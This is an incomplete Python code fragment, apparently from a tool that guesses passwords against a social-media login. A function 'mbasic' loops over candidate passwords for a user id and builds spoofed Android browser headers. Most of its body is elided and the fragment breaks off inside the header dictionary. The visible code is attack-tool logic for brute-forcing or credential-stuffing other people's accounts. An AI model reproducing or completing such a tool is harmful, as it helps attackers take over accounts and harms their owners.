...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            headers = {
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": '"Android WebView";v="106", "Not=A?Brand";v="8", "Chromium";v="106"',
            "sec-ch-ua-model": "",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-prefers-color-scheme": "light",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; Infinix X6526) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.1520.97 Mobile Safari/537.36",
